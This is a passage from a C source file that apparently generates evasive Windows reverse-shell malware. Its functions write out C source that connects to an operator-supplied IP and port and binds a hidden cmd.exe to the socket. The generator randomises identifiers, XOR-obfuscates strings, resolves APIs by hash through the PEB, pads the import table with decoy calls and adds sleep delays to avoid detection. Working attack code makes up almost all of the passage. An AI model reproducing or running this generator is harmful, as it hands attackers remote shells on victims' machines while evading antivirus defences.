    generate_random_string(htons_hash_name, sizeof(htons_hash_name));
    generate_random_string(connect_hash_name, sizeof(connect_hash_name));
    generate_random_string(closesocket_hash_name, sizeof(closesocket_hash_name));
    generate_random_string(wsacleanup_hash_name, sizeof(wsacleanup_hash_name));
    generate_random_string(createprocessa_hash_name, sizeof(createprocessa_hash_name));
    generate_random_string(ntwait_hash_name, sizeof(ntwait_hash_name));
    generate_random_string(ntdelay_hash_name, sizeof(ntdelay_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));

    // Random typedef names
    char WSAStartup_typedef[12], WSASocketA_typedef[12], inet_pton_typedef[12];
    char htons_typedef[12], connect_typedef[12], closesocket_typedef[12];
    char WSACleanup_typedef[12], CreateProcessA_typedef[12], NtWait_typedef[12];
    char NtDelay_typedef[12], NtClose_typedef[12], LoadLibraryA_typedef[12];

    generate_random_string(WSAStartup_typedef, sizeof(WSAStartup_typedef));
    generate_random_string(WSASocketA_typedef, sizeof(WSASocketA_typedef));
    generate_random_string(inet_pton_typedef, sizeof(inet_pton_typedef));
    generate_random_string(htons_typedef, sizeof(htons_typedef));
    generate_random_string(connect_typedef, sizeof(connect_typedef));
    generate_random_string(closesocket_typedef, sizeof(closesocket_typedef));
    generate_random_string(WSACleanup_typedef, sizeof(WSACleanup_typedef));
    generate_random_string(CreateProcessA_typedef, sizeof(CreateProcessA_typedef));
    generate_random_string(NtWait_typedef, sizeof(NtWait_typedef));
    generate_random_string(NtDelay_typedef, sizeof(NtDelay_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));

    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s               0x84BD0AA5\n"
        "#define %s                  0xC9D1067D\n"
        "#define %s           0x0E32C08B\n"
        "#define %s             0xB703C453\n"
        "#define %s             0x5F3B12CA\n"
        "#define %s              0xBD120405\n"
        "#define %s                  0x17387BA1\n"
        "#define %s                0x13BF4FDF\n"
        "#define %s            0xF77E6C94\n"
        "#define %s             0x9CA98668\n"
        "#define %s         0x579FB1E9\n"
        "#define %s  0x2131236C\n"
        "#define %s                0x50DCFD5A\n"
        "#define %s       0x7E1EA2ED\n\n"
        "typedef int (WINAPI* %s)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* %s)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef int (WSAAPI* %s)(INT, PCSTR, PVOID);\n"
        "typedef u_short(WINAPI* %s)(u_short);\n"
        "typedef int (WINAPI* %s)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* %s)(SOCKET);\n"
        "typedef int (WINAPI* %s)(void);\n"
        "typedef BOOL(WINAPI* %s)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* %s)(LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n\n"
        "#define INITIAL_HASH 5429\n"
        "#define INITIAL_SEED 6\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY		pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD						FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD						FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD						FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB					pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB					pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char pkx[] = \"%s\";\n"
        "char hpi[] = {%s};\n"
        "char hcm[] = {%s};\n"
        "char ws2[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n\n"
        "void %s(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "void %s(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "void %s() {\n"
        "    %s((char*)hcm, sizeof(hcm), pkx, sizeof(pkx));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    int i = 0;\n"
        "    while (1) {\n"
        "        WSADATA wsaData;\n"
        "        p%s(MAKEWORD(2, 2), &wsaData);\n"
        "        SOCKET sock = p%s(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "        if (sock == INVALID_SOCKET) {\n"
        "            p%s();\n"
        "        }\n"
        "        struct sockaddr_in server;\n"
        "        server.sin_family = AF_INET;\n"
        "        server.sin_port = p%s(%d);\n"
        "        %s((char*)hpi, sizeof(hpi), pkx, sizeof(pkx));\n"
        "        p%s(AF_INET, hpi, &server.sin_addr);\n"
        "        if (p%s(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {\n"
        "            p%s(sock);\n"
        "            p%s();\n"
        "        }\n"
        "        STARTUPINFO si;\n"
        "        PROCESS_INFORMATION pi;\n"
        "        %s(&si, sizeof(si));\n"
        "        si.cb = sizeof(si);\n"
        "        si.dwFlags = STARTF_USESTDHANDLES;\n"
        "        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;\n"
        "        p%s(NULL, hcm, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n"
        "        i++;\n"
        "        if (i == 3) {\n"
        "            p%s(pi.hProcess, FALSE, &timeout);\n"
        "            p%s(pi.hProcess);\n"
        "            p%s(pi.hThread);\n"
        "            p%s(sock);\n"
        "            p%s();\n"
        "            break;\n"
        "        }\n"
        "        else {\n"
        "            p%s(pi.hProcess, FALSE, NULL);\n"
        "            p%s(pi.hProcess);\n"
        "            p%s(pi.hThread);\n"
        "            p%s(sock);\n"
        "            p%s();\n"
        "            %s(0.1);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE pkn = %s(%s);\n"
        "    HMODULE pnd = %s(%s);\n"
        "    %s p%s = (%s)%s(pkn, %s);\n"
        "    %s((char*)ws2, sizeof(ws2), pkx, sizeof(pkx));\n"
        "    HMODULE phw = p%s(ws2);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(phw, %s);\n"
        "    p%s = (%s)%s(pkn, %s);\n"
        "    p%s = (%s)%s(pnd, %s);\n"
        "    p%s = (%s)%s(pnd, %s);\n"
        "    p%s = (%s)%s(pnd, %s);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE , HINSTANCE , LPSTR , int ) {\n"
        "    %s();\n"
        "    %s(0.1);\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        kernel32_hash_name,
        ntdll_hash_name,
        loadlibrarya_hash_name,
        wsastartup_hash_name,
        wsasocketa_hash_name,
        inet_pton_hash_name,
        htons_hash_name,
        connect_hash_name,
        closesocket_hash_name,
        wsacleanup_hash_name,
        createprocessa_hash_name,
        ntwait_hash_name,
        ntdelay_hash_name,
        ntclose_hash_name,
        WSAStartup_typedef,
        WSASocketA_typedef,
        inet_pton_typedef,
        htons_typedef,
        connect_typedef,
        closesocket_typedef,
        WSACleanup_typedef,
        CreateProcessA_typedef,
        LoadLibraryA_typedef,
        NtWait_typedef,
        NtDelay_typedef,
        NtClose_typedef,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_obf_func,
        xkey, obf_ip, obf_cmd, obf_ws2dll,
        WSAStartup_typedef, pWSAStartup_name,
        WSASocketA_typedef, pWSASocketA_name,
        inet_pton_typedef, pinet_pton_name,
        htons_typedef, phtons_name,
        connect_typedef, pconnect_name,
        closesocket_typedef, pclosesocket_name,
        WSACleanup_typedef, pWSACleanup_name,
        CreateProcessA_typedef, pCreateProcessA_name,
        NtWait_typedef, pNtWait_name,
        NtDelay_typedef, pNtDelay_name,
        NtClose_typedef, pNtClose_name,
        LoadLibraryA_typedef, pLoadLib_name,
        random_zero_func,
        random_delay_func,
        pNtDelay_name,
        random_connect_func,
        random_obf_func,
        pWSAStartup_name,
        pWSASocketA_name,
        pWSACleanup_name,
        phtons_name, port,
        random_obf_func,
        pinet_pton_name,
        pconnect_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_zero_func,
        pCreateProcessA_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pWSACleanup_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_delay_func,
        random_init_func,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLib_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func,
        pLoadLib_name,
        pWSAStartup_name, WSAStartup_typedef, random_getproc_name, wsastartup_hash_name,
        pWSASocketA_name, WSASocketA_typedef, random_getproc_name, wsasocketa_hash_name,
        pinet_pton_name, inet_pton_typedef, random_getproc_name, inet_pton_hash_name,
        phtons_name, htons_typedef, random_getproc_name, htons_hash_name,
        pconnect_name, connect_typedef, random_getproc_name, connect_hash_name,
        pclosesocket_name, closesocket_typedef, random_getproc_name, closesocket_hash_name,
        pWSACleanup_name, WSACleanup_typedef, random_getproc_name, wsacleanup_hash_name,
        pCreateProcessA_name, CreateProcessA_typedef, random_getproc_name, createprocessa_hash_name,
        pNtWait_name, NtWait_typedef, random_getproc_name, ntwait_hash_name,
        pNtDelay_name, NtDelay_typedef, random_getproc_name, ntdelay_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_init_func,
        random_delay_func,
        random_connect_func
    );
}
void obf_2_tcp__time_dll(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_func_name[10], random_var_name[10], random_helper_name[10];
    char random_toUpper_name[10], random_memcpy_name[10], random_seed_name[10];
    char random_obf_func[10], random_zero_func[10], random_delay_func[10];
    char random_connect_func[10], random_init_func[10];

    generate_random_string(random_func_name, sizeof(random_func_name));
    generate_random_string(random_var_name, sizeof(random_var_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_memcpy_name, sizeof(random_memcpy_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_zero_func, sizeof(random_zero_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_connect_func, sizeof(random_connect_func));
    generate_random_string(random_init_func, sizeof(random_init_func));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pWSAStartup_name[9], pWSASocketA_name[9], pinet_pton_name[9];
    char phtons_name[9], pconnect_name[9], pclosesocket_name[9];
    char pWSACleanup_name[9], pCreateProcessA_name[9], pNtWait_name[9];
    char pNtDelay_name[9], pNtClose_name[9], pLoadLib_name[9];

    generate_random_string(pWSAStartup_name, sizeof(pWSAStartup_name));
    generate_random_string(pWSASocketA_name, sizeof(pWSASocketA_name));
    generate_random_string(pinet_pton_name, sizeof(pinet_pton_name));
    generate_random_string(phtons_name, sizeof(phtons_name));
    generate_random_string(pconnect_name, sizeof(pconnect_name));
    generate_random_string(pclosesocket_name, sizeof(pclosesocket_name));
    generate_random_string(pWSACleanup_name, sizeof(pWSACleanup_name));
    generate_random_string(pCreateProcessA_name, sizeof(pCreateProcessA_name));
    generate_random_string(pNtWait_name, sizeof(pNtWait_name));
    generate_random_string(pNtDelay_name, sizeof(pNtDelay_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pLoadLib_name, sizeof(pLoadLib_name));

    // Random names for hashing definitions
    char kernel32_hash_name[11], ntdll_hash_name[12], loadlibrarya_hash_name[11];
    char wsastartup_hash_name[11], wsasocketa_hash_name[12], inet_pton_hash_name[12];
    char htons_hash_name[10], connect_hash_name[11], closesocket_hash_name[11];
    char wsacleanup_hash_name[13], createprocessa_hash_name[15], ntwait_hash_name[14];
    char ntdelay_hash_name[8], ntclose_hash_name[12];

    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(wsastartup_hash_name, sizeof(wsastartup_hash_name));
    generate_random_string(wsasocketa_hash_name, sizeof(wsasocketa_hash_name));
    generate_random_string(inet_pton_hash_name, sizeof(inet_pton_hash_name));
    generate_random_string(htons_hash_name, sizeof(htons_hash_name));
    generate_random_string(connect_hash_name, sizeof(connect_hash_name));
    generate_random_string(closesocket_hash_name, sizeof(closesocket_hash_name));
    generate_random_string(wsacleanup_hash_name, sizeof(wsacleanup_hash_name));
    generate_random_string(createprocessa_hash_name, sizeof(createprocessa_hash_name));
    generate_random_string(ntwait_hash_name, sizeof(ntwait_hash_name));
    generate_random_string(ntdelay_hash_name, sizeof(ntdelay_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));

    // Random typedef names
    char WSAStartup_typedef[12], WSASocketA_typedef[12], inet_pton_typedef[12];
    char htons_typedef[12], connect_typedef[12], closesocket_typedef[12];
    char WSACleanup_typedef[12], CreateProcessA_typedef[12], NtWait_typedef[12];
    char NtDelay_typedef[12], NtClose_typedef[12], LoadLibraryA_typedef[12];

    generate_random_string(WSAStartup_typedef, sizeof(WSAStartup_typedef));
    generate_random_string(WSASocketA_typedef, sizeof(WSASocketA_typedef));
    generate_random_string(inet_pton_typedef, sizeof(inet_pton_typedef));
    generate_random_string(htons_typedef, sizeof(htons_typedef));
    generate_random_string(connect_typedef, sizeof(connect_typedef));
    generate_random_string(closesocket_typedef, sizeof(closesocket_typedef));
    generate_random_string(WSACleanup_typedef, sizeof(WSACleanup_typedef));
    generate_random_string(CreateProcessA_typedef, sizeof(CreateProcessA_typedef));
    generate_random_string(NtWait_typedef, sizeof(NtWait_typedef));
    generate_random_string(NtDelay_typedef, sizeof(NtDelay_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));

    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "#define %s               0xA5E086A2\n"
        "#define %s                  0x5251037A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s             0x5925BC50\n"
        "#define %s             0xE2F31987\n"
        "#define %s              0xB9D29D42\n"
        "#define %s                  0xBC98541E\n"
        "#define %s                0x068FB8DC\n"
        "#define %s            0x65188A91\n"
        "#define %s             0xE6AD20A5\n"
        "#define %s         0x4CA64FE6\n"
        "#define %s  0xCB42C5A9\n"
        "#define %s                0x1236E2D7\n"
        "#define %s       0xF20D7F2A\n\n"
        "typedef int (WINAPI* %s)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* %s)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef int (WSAAPI* %s)(INT, PCSTR, PVOID);\n"
        "typedef u_short(WINAPI* %s)(u_short);\n"
        "typedef int (WINAPI* %s)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* %s)(SOCKET);\n"
        "typedef int (WINAPI* %s)(void);\n"
        "typedef BOOL(WINAPI* %s)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* %s)(LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xey[] = \"%s\";\n"
        "char hp[] = {%s};\n"
        "char pdm[] = {%s};\n"
        "char ws2[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n\n"
        "VOID %s(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s((char*)pdm, sizeof(pdm), xey, sizeof(xey));\n"
        "    %s((char*)hp, sizeof(hp), xey, sizeof(xey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    WSADATA wsadata;\n"
        "    p%s(MAKEWORD(2, 2), &wsadata);\n"
        "    SOCKET socket = p%s(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (socket == INVALID_SOCKET) {\n"
        "        p%s();\n"
        "    }\n"
        "    struct sockaddr_in remot_addr;\n"
        "    remot_addr.sin_family = AF_INET;\n"
        "    remot_addr.sin_port = p%s(%d);\n"
        "    p%s(AF_INET, hp, &remot_addr.sin_addr);\n"
        "    if (p%s(socket, (SOCKADDR*)&remot_addr, sizeof(remot_addr)) == SOCKET_ERROR) {\n"
        "        p%s(socket);\n"
        "        p%s();\n"
        "    }\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    %s(&si, sizeof(si));\n"
        "    si.cb = sizeof(si);\n"
        "    si.dwFlags = STARTF_USESTDHANDLES;\n"
        "    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;\n"
        "    if (p%s(NULL, pdm, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
        "        p%s(pi.hProcess, FALSE, &timeout);\n"
        "    }\n"
        "    p%s(pi.hProcess);\n"
        "    p%s(pi.hThread);\n"
